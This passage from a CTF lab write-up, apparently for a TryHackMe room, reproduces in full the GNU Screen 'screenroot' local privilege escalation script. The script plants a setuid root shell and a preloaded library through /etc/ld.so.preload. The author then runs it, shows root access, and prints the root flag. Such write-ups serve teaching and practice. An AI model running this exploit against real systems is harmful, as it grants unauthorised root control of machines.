+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;~ gnu/screenroot ~&#34;</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[+] First, we create our shell and library...&#34;</span>
+</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt; EOF &gt; /tmp/libhax.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#include &lt;stdio.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#include &lt;sys/types.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#include &lt;unistd.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">__attribute__ ((__constructor__))
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">void dropshell(void){
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    chown(&#34;/tmp/rootshell&#34;, 0, 0);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    chmod(&#34;/tmp/rootshell&#34;, 04755);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    unlink(&#34;/etc/ld.so.preload&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    printf(&#34;[+] done!\n&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+</span></span><span style="display:flex;"><span>rm -f /tmp/libhax.c
+</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt; EOF &gt; /tmp/rootshell.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#include &lt;stdio.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">int main(void){
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    setuid(0);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    setgid(0);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    seteuid(0);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    setegid(0);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    execvp(&#34;/bin/sh&#34;, NULL, NULL);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>gcc -o /tmp/rootshell /tmp/rootshell.c
+</span></span><span style="display:flex;"><span>rm -f /tmp/rootshell.c
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[+] Now we create our /etc/ld.so.preload file...&#34;</span>
+</span></span><span style="display:flex;"><span>cd /etc
+</span></span><span style="display:flex;"><span>umask <span style="color:#ae81ff">000</span> <span style="color:#75715e"># because</span>
+</span></span><span style="display:flex;"><span>screen -D -m -L ld.so.preload echo -ne  <span style="color:#e6db74">&#34;\x0a/tmp/libhax.so&#34;</span> <span style="color:#75715e"># newline needed</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[+] Triggering...&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>screen -ls <span style="color:#75715e"># screen itself is setuid, so... </span>
+</span></span><span style="display:flex;"><span>/tmp/rootshell
+</span></span></code></pre></div><p>I make a new file and I enter this exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>joker@ubuntu:~$ touch exploit.sh
+</span></span><span style="display:flex;"><span>joker@ubuntu:~$ nano exploit.sh
+</span></span></code></pre></div><p>I give him permission to execute:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>joker@ubuntu:~$ chmod +x exploit.sh
+</span></span></code></pre></div><p>I execute this file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>joker@ubuntu:~$ ./exploit.sh
+</span></span><span style="display:flex;"><span>~ gnu/screenroot ~
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> First, we create our shell and library...
+</span></span><span style="display:flex;"><span>/tmp/libhax.c: In <span style="color:#66d9ef">function</span> ‘dropshell’:
+</span></span><span style="display:flex;"><span>/tmp/libhax.c:7:5: warning: implicit declaration of <span style="color:#66d9ef">function</span> ‘chmod’ <span style="color:#f92672">[</span>-Wimplicit-function-declaration<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>     chmod<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/tmp/rootshell&#34;</span>, 04755<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>     ^
+</span></span><span style="display:flex;"><span>/tmp/rootshell.c: In <span style="color:#66d9ef">function</span> ‘main’:
+</span></span><span style="display:flex;"><span>/tmp/rootshell.c:3:5: warning: implicit declaration of <span style="color:#66d9ef">function</span> ‘setuid’ <span style="color:#f92672">[</span>-Wimplicit-function-declaration<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>     setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>     ^
+</span></span><span style="display:flex;"><span>/tmp/rootshell.c:4:5: warning: implicit declaration of <span style="color:#66d9ef">function</span> ‘setgid’ <span style="color:#f92672">[</span>-Wimplicit-function-declaration<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>     setgid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>     ^
+</span></span><span style="display:flex;"><span>/tmp/rootshell.c:5:5: warning: implicit declaration of <span style="color:#66d9ef">function</span> ‘seteuid’ <span style="color:#f92672">[</span>-Wimplicit-function-declaration<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>     seteuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>     ^
+</span></span><span style="display:flex;"><span>/tmp/rootshell.c:6:5: warning: implicit declaration of <span style="color:#66d9ef">function</span> ‘setegid’ <span style="color:#f92672">[</span>-Wimplicit-function-declaration<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>     setegid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>     ^
+</span></span><span style="display:flex;"><span>/tmp/rootshell.c:7:5: warning: implicit declaration of <span style="color:#66d9ef">function</span> ‘execvp’ <span style="color:#f92672">[</span>-Wimplicit-function-declaration<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>     execvp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, NULL, NULL<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>     ^
+</span></span><span style="display:flex;"><span>/usr/bin/ld: cannot open output file /tmp/rootshell: Permission denied
+</span></span><span style="display:flex;"><span>collect2: error: ld returned <span style="color:#ae81ff">1</span> exit status
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Now we create our /etc/ld.so.preload file...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Triggering...
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span> from /etc/ld.so.preload cannot be preloaded <span style="color:#f92672">(</span>cannot open shared object file<span style="color:#f92672">)</span>: ignored.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#66d9ef">done</span>!
+</span></span><span style="display:flex;"><span>No Sockets found in /tmp/screens/S-joker.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># whoami</span>
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>I get the root flag(<code>root.txt</code>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e"># cat /root/root.txt</span>
+</span></span><span style="display:flex;"><span>THM<span style="color:#f92672">{</span>5ecd98aa66a6abb670184d7547c8124a<span style="color:#f92672">}</span>  &lt;-- root flag
+</span></span></code></pre></div>
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="/posts/inject/">
+                <span class="button__icon">←</span>
+                <span class="button__text">HTB Writeup - Inject (Easy)</span>
+            </a>
+        </span>
+        
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>CyberSpider</span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
